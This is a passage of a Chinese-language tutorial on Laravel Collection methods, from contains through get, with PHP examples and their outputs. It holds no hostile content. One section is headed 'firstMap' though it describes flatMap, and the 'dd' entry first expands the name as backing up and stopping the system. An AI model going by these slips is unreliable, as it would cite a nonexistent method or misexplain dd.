class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'boo'</span>, <span class="string">'age'</span> =&gt; <span class="number">25</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'yumi'</span>, <span class="string">'age'</span> =&gt; <span class="number">23</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;contains(<span class="string">"name"</span>, <span class="string">"mac"</span>);  <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>也可以传递一个回调到 contains 方法来执行自己的真实测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $value: 1 $key: 0</span></span><br><span class="line">$collection-&gt;contains(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $value &gt; <span class="number">5</span>;</span><br><span class="line">&#125;); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>contains 方法在检查项目值时使用「宽松」比较，意味着具有整数值的字符串将被视为等于相同值的整数。 相反 containsStrict 方法则是使用「严格」比较进行过滤。</p><h3 id="containsStrict"><a href="#containsStrict" class="headerlink" title="containsStrict"></a>containsStrict</h3><p>使用「严格模式」判断集合是否包含给定的项目：</p><p>基本使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'boo'</span>, <span class="string">'age'</span> =&gt; <span class="number">25</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'yumi'</span>, <span class="string">'age'</span> =&gt; <span class="number">23</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;containsStrict(<span class="string">"age"</span>, <span class="string">"25"</span>);  <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>如上例所示，数组值存在，但是值类型不一致也返回false。</p><h3 id="count"><a href="#count" class="headerlink" title="count"></a>count</h3><p>返回该集合内的项目总数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])-&gt;count();  <span class="comment">// 4</span></span><br></pre></td></tr></table></figure><h3 id="countBy"><a href="#countBy" class="headerlink" title="countBy"></a>countBy</h3><p>统计集合中每个元素出现的次数。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>]);</span><br><span class="line">$counted = $collection-&gt;countBy();</span><br><span class="line">$counted-&gt;all();</span><br><span class="line"><span class="comment">// [1 =&gt; 1, 2 =&gt; 3, 3 =&gt; 1, 5=&gt;2]</span></span><br></pre></td></tr></table></figure><p>进阶用法，自定义规则，统计元素出现的次数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection &#x3D; collect([&#39;alice@gmail.com&#39;, &#39;bob@yahoo.com&#39;, &#39;carlos@gmail.com&#39;]);</span><br><span class="line">$counted &#x3D; $collection-&gt;countBy(function ($email) &#123;</span><br><span class="line">    return substr(strrchr($email, &quot;@&quot;), 1);</span><br><span class="line">&#125;);</span><br><span class="line">$counted-&gt;all();</span><br><span class="line">&#x2F;&#x2F; [&#39;gmail.com&#39; &#x3D;&gt; 2, &#39;yahoo.com&#39; &#x3D;&gt; 1]</span><br></pre></td></tr></table></figure><h3 id="crossJoin"><a href="#crossJoin" class="headerlink" title="crossJoin"></a>crossJoin</h3><p>返回指定集合的可能的笛卡尔积。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">$matrix = $collection-&gt;crossJoin([<span class="string">'a'</span>, <span class="string">'b'</span>]);</span><br><span class="line"></span><br><span class="line">$matrix-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        [1, 'a'],</span></span><br><span class="line"><span class="comment">        [1, 'b'],</span></span><br><span class="line"><span class="comment">        [2, 'a'],</span></span><br><span class="line"><span class="comment">        [2, 'b'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">$matrix = $collection-&gt;crossJoin([<span class="string">'a'</span>, <span class="string">'b'</span>], [<span class="string">'I'</span>, <span class="string">'II'</span>]);</span><br><span class="line"></span><br><span class="line">$matrix-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        [1, 'a', 'I'],</span></span><br><span class="line"><span class="comment">        [1, 'a', 'II'],</span></span><br><span class="line"><span class="comment">        [1, 'b', 'I'],</span></span><br><span class="line"><span class="comment">        [1, 'b', 'II'],</span></span><br><span class="line"><span class="comment">        [2, 'a', 'I'],</span></span><br><span class="line"><span class="comment">        [2, 'a', 'II'],</span></span><br><span class="line"><span class="comment">        [2, 'b', 'I'],</span></span><br><span class="line"><span class="comment">        [2, 'b', 'II'],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><p>备份文件系统和停止系统（dump and die）的缩写，打印集合元素并中断脚本执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'John Doe'</span>, <span class="string">'Jane Doe'</span>]);</span><br><span class="line">$collection-&gt;dd();</span><br></pre></td></tr></table></figure><p>如果不想中断执行脚本，请使用<code>dump</code>方法替代。</p><h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><p>打印集合项而不终止脚本执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'John Doe'</span>, <span class="string">'Jane Doe'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;dump();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Collection &#123;</span></span><br><span class="line"><span class="comment">        #items: array:2 [</span></span><br><span class="line"><span class="comment">            0 =&gt; "John Doe"</span></span><br><span class="line"><span class="comment">            1 =&gt; "Jane Doe"</span></span><br><span class="line"><span class="comment">        ]</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><p>与给定的集合或者数组进行比较，基于值求差集。</p><p>将集合与其它集合或纯 PHP 数组进行值的比较，然后返回原集合中存在而给定集合中不存在的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">$collection-&gt;diff([<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>])-&gt;all();   <span class="comment">// [1, 3, 5]</span></span><br></pre></td></tr></table></figure><h3 id="diffAssoc"><a href="#diffAssoc" class="headerlink" title="diffAssoc"></a>diffAssoc</h3><p>与给定的集合或者数组进行比较，基于键值对求差集。</p><p>返回原集合不存在于给定集合中的键值对：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="string">'color'</span> =&gt; <span class="string">'orange'</span>,</span><br><span class="line">    <span class="string">'type'</span> =&gt; <span class="string">'fruit'</span>,</span><br><span class="line">    <span class="string">'remain'</span> =&gt; <span class="number">6</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$diff = $collection-&gt;diffAssoc([</span><br><span class="line">    <span class="string">'color'</span> =&gt; <span class="string">'yellow'</span>,</span><br><span class="line">    <span class="string">'type'</span> =&gt; <span class="string">'fruit'</span>,</span><br><span class="line">    <span class="string">'remain'</span> =&gt; <span class="number">3</span>,</span><br><span class="line">    <span class="string">'used'</span> =&gt; <span class="number">6</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$diff-&gt;all(); <span class="comment">// ['color' =&gt; 'orange', 'remain' =&gt; 6]</span></span><br></pre></td></tr></table></figure><h3 id="diffKeys"><a href="#diffKeys" class="headerlink" title="diffKeys"></a>diffKeys</h3><p>与给定的集合或者数组进行比较，基于键求差集。</p><p>返回原集合中存在而给定的集合中不存在「键」所对应的键值对：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="string">'one'</span> =&gt; <span class="number">10</span>,</span><br><span class="line">    <span class="string">'two'</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="string">'three'</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">'four'</span> =&gt; <span class="number">40</span>,</span><br><span class="line">    <span class="string">'five'</span> =&gt; <span class="number">50</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$diff = $collection-&gt;diffKeys([</span><br><span class="line">    <span class="string">'two'</span> =&gt; <span class="number">2</span>,</span><br><span class="line">    <span class="string">'four'</span> =&gt; <span class="number">4</span>,</span><br><span class="line">    <span class="string">'six'</span> =&gt; <span class="number">6</span>,</span><br><span class="line">    <span class="string">'eight'</span> =&gt; <span class="number">8</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$diff-&gt;all(); <span class="comment">// ['one' =&gt; 10, 'three' =&gt; 30, 'five' =&gt; 50]</span></span><br></pre></td></tr></table></figure><h3 id="duplicates"><a href="#duplicates" class="headerlink" title="duplicates"></a>duplicates</h3><p>从集合中检索并返回重复的值。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'b'</span>]);</span><br><span class="line">$collection-&gt;duplicates();</span><br><span class="line"><span class="comment">// [2 =&gt; 'a', 4 =&gt; 'b']</span></span><br></pre></td></tr></table></figure><p>如果集合包含数组或对象，则可以传递希望检查重复值的属性的键：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$employees = collect([</span><br><span class="line">    [<span class="string">'email'</span> =&gt; <span class="string">'abigail@example.com'</span>, <span class="string">'position'</span> =&gt; <span class="string">'Developer'</span>],</span><br><span class="line">    [<span class="string">'email'</span> =&gt; <span class="string">'james@example.com'</span>, <span class="string">'position'</span> =&gt; <span class="string">'Designer'</span>],</span><br><span class="line">    [<span class="string">'email'</span> =&gt; <span class="string">'victoria@example.com'</span>, <span class="string">'position'</span> =&gt; <span class="string">'Developer'</span>],</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">$employees-&gt;duplicates(<span class="string">'position'</span>);</span><br><span class="line"><span class="comment">// [2 =&gt; 'Developer']</span></span><br></pre></td></tr></table></figure><p><code>duplicates</code> 方法在检查项目值时使用「宽松」比较，相反<code>duplicatesStrict</code> 方法则是使用「严格」比较进行过滤。</p><h3 id="each"><a href="#each" class="headerlink" title="each"></a>each</h3><p>迭代集合中的内容并将其传递到回调函数中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = $collection-&gt;each(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果要中断对内容的迭代，那就从回调中返回 false</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="comment">/* some condition */</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="eachSpread"><a href="#eachSpread" class="headerlink" title="eachSpread"></a>eachSpread</h3><p>同样是遍历集合，不过与each 的区别在于，对于多维数组，可以直接拿到元素。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([[<span class="string">'Boo'</span>, <span class="number">25</span>, <span class="string">"men"</span>], [<span class="string">'Yumi'</span>, <span class="number">23</span>, <span class="string">"woman"</span>]]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;eachSpread(<span class="function"><span class="keyword">function</span> <span class="params">($name, $age, $gender)</span> </span>&#123;</span><br><span class="line">    var_dump($name, $age, $gender);</span><br><span class="line">    <span class="comment">// Boo、25、men</span></span><br><span class="line">    <span class="comment">// Yumi、23、woman</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$collection-&gt;each(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span></span>&#123;</span><br><span class="line">   <span class="comment">// 同样可以在回调函数中，返回false ，终止循环</span></span><br><span class="line">   var_dump($item, $key);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    array(3) &#123;</span></span><br><span class="line"><span class="comment">      [0]=&gt;</span></span><br><span class="line"><span class="comment">      string(3) "Boo"</span></span><br><span class="line"><span class="comment">      [1]=&gt;</span></span><br><span class="line"><span class="comment">      int(25)</span></span><br><span class="line"><span class="comment">      [2]=&gt;</span></span><br><span class="line"><span class="comment">      string(3) "men"</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="every"><a href="#every" class="headerlink" title="every"></a>every</h3><p>检查集合中的每一个元素是否通过指定条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">collect([1, 2, 3, 4])-&gt;every(function ($value, $key) &#123;</span><br><span class="line">    return $value &gt; 2;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; false</span><br></pre></td></tr></table></figure><p>注意：如果集合为空， every 将返回 true。</p><h3 id="except"><a href="#except" class="headerlink" title="except"></a>except</h3><p>返回集合中除了指定键以外的所有项目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="number">1</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>, <span class="string">'discount'</span> =&gt; <span class="keyword">false</span>]);</span><br><span class="line">$filtered = $collection-&gt;except([<span class="string">'price'</span>, <span class="string">'discount'</span>]);</span><br><span class="line">$filtered-&gt;all(); <span class="comment">// ['product_id' =&gt; 1]</span></span><br></pre></td></tr></table></figure><p>与之相反的方法是 <code>only()</code>。</p><h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>使用给定的回调函数过滤集合的内容，只留下那些通过的元素。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line">$filtered = $collection-&gt;filter(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当闭包返回true 时，保留一个条目</span></span><br><span class="line">    <span class="keyword">return</span> $value &gt; <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$filtered-&gt;all(); <span class="comment">// [3, 4]</span></span><br></pre></td></tr></table></figure><p>如果没有提供回调函数，集合中所有返回false的元素都会被移除：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="string">''</span>, <span class="number">0</span>, []]);</span><br><span class="line">$collection-&gt;filter()-&gt;all(); <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>与之相反的方法是 <code>reject()</code>。</p><h3 id="first"><a href="#first" class="headerlink" title="first"></a>first</h3><p>返回集合中的第一个元素。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])-&gt;first();  <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>同样可以传入回调函数，进行条件限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])-&gt;first(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当闭包返回true 时，保留一个条目</span></span><br><span class="line">    <span class="keyword">return</span> $value &gt; <span class="number">2</span>;</span><br><span class="line">&#125;); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>如果需要返回最后一个元素可以使用<code>last()</code> 方法。</p><h3 id="firstWhere"><a href="#firstWhere" class="headerlink" title="firstWhere"></a>firstWhere</h3><p>返回集合中含有指定键 / 值对的第一个元素：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Regena'</span>, <span class="string">'age'</span> =&gt; <span class="keyword">null</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Linda'</span>, <span class="string">'age'</span> =&gt; <span class="number">14</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Diego'</span>, <span class="string">'age'</span> =&gt; <span class="number">23</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Linda'</span>, <span class="string">'age'</span> =&gt; <span class="number">84</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回name = Linda 的第一个元素</span></span><br><span class="line">$collection-&gt;firstWhere(<span class="string">'name'</span>, <span class="string">'Linda'</span>);</span><br><span class="line"><span class="comment">// ['name' =&gt; 'Linda', 'age' =&gt; 14]</span></span><br></pre></td></tr></table></figure><p>还可以在firstWhere 中使用算术运算符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection-&gt;firstWhere(<span class="string">'age'</span>, <span class="string">'&gt;='</span>, <span class="number">18</span>);</span><br><span class="line"><span class="comment">// ['name' =&gt; 'Diego', 'age' =&gt; 23]</span></span><br></pre></td></tr></table></figure><p>和 where 方法一样，你可以将一个参数传递给 firstWhere 方法。在这种情况下， firstWhere 方法将返回指定键的值为「真」的第一个集合项：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection-&gt;firstWhere(<span class="string">'age'</span>);</span><br><span class="line"><span class="comment">// ['name' =&gt; 'Linda', 'age' =&gt; 14]</span></span><br></pre></td></tr></table></figure><h3 id="firstMap"><a href="#firstMap" class="headerlink" title="firstMap"></a>firstMap</h3><p>遍历集合并将其中的每个值传递到给定的回调。</p><p>可以通过回调修改每个值的内容再返回出来，从而形成一个新的被修改过内容的集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Sally'</span>],</span><br><span class="line">    [<span class="string">'school'</span> =&gt; <span class="string">'Arkansas'</span>],</span><br><span class="line">    [<span class="string">'age'</span> =&gt; <span class="number">28</span>]</span><br><span class="line">]);</span><br><span class="line">$flattened = $collection-&gt;flatMap(<span class="function"><span class="keyword">function</span> <span class="params">($values)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_map(<span class="string">'strtoupper'</span>, $values);</span><br><span class="line">&#125;);</span><br><span class="line">$flattened-&gt;all();</span><br><span class="line"><span class="comment">// ['name' =&gt; 'SALLY', 'school' =&gt; 'ARKANSAS', 'age' =&gt; '28'];</span></span><br></pre></td></tr></table></figure><h3 id="flatten"><a href="#flatten" class="headerlink" title="flatten"></a>flatten</h3><p>将多维集合转为一维。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'languages'</span> =&gt; [<span class="string">'php'</span>, <span class="string">'javascript'</span>]]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;flatten()-&gt;all();  <span class="comment">// ['taylor', 'php', 'javascript'];</span></span><br></pre></td></tr></table></figure><p>还可以选择性地传入「深度」参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="string">'Apple'</span> =&gt; [</span><br><span class="line">        [<span class="string">'name'</span> =&gt; <span class="string">'iPhone 6S'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Apple'</span>],</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'Samsung'</span> =&gt; [</span><br><span class="line">        [<span class="string">'name'</span> =&gt; <span class="string">'Galaxy S7'</span>, <span class="string">'brand'</span> =&gt; <span class="string">'Samsung'</span>]</span><br><span class="line">    ],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$products = $collection-&gt;flatten(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$products-&gt;values()-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[</span></span><br><span class="line"><span class="comment">    ['name' =&gt; 'iPhone 6S', 'brand' =&gt; 'Apple'],</span></span><br><span class="line"><span class="comment">    ['name' =&gt; 'Galaxy S7', 'brand' =&gt; 'Samsung'],</span></span><br><span class="line"><span class="comment">]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>在这个例子里，调用 flatten 方法时不传入深度参数的话也会将嵌套数组转成一维的，然后返回 <code>[&#39;iPhone 6S&#39;, &#39;Apple&#39;, &#39;Galaxy S7&#39;, &#39;Samsung&#39;]</code>，传入深度参数能限制设置返回数组的层数。</p><h3 id="flip"><a href="#flip" class="headerlink" title="flip"></a>flip</h3><p>键值反转。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">"name"</span> =&gt; <span class="string">"boo"</span>, <span class="string">"age"</span> =&gt; <span class="number">25</span>]);</span><br><span class="line">$collection-&gt;flip()-&gt;all();  <span class="comment">// ["boo" =&gt; "name", 25 =&gt; "age"]</span></span><br></pre></td></tr></table></figure><h3 id="forget"><a href="#forget" class="headerlink" title="forget"></a>forget</h3><p>通过给定的键来移除掉集合中对应的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'framework'</span> =&gt; <span class="string">'laravel'</span>]);</span><br><span class="line">$collection-&gt;forget(<span class="string">'name'</span>);</span><br><span class="line">$collection-&gt;all(); </span><br><span class="line"><span class="comment">// ['framework' =&gt; 'laravel']</span></span><br></pre></td></tr></table></figure><p>与大多数集合的方法不同，<code>forget()</code> 不会返回修改过后的新集合；它会直接修改原来的集合。</p><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>返回给定键的项目。</p><p>基本用法，如果该键不存在，则返回 null：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'framework'</span> =&gt; <span class="string">'laravel'</span>]);</span><br><span class="line">$value = $collection-&gt;get(<span class="string">'name'</span>); <span class="comment">// taylor</span></span><br></pre></td></tr></table></figure><p>可以传递第二个参数作为默认值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'taylor'</span>, <span class="string">'framework'</span> =&gt; <span class="string">'laravel'</span>]);</span><br><span class="line">$value = $collection-&gt;get(<span class="string">'foo'</span>, <span class="string">'boo'</span>); <span class="comment">// boo</span></span><br></pre></td></tr></table></figure><p>甚至可以将回调函数当作默认值。如果指定的键不存在，就会返回回调的结果：</p><figure 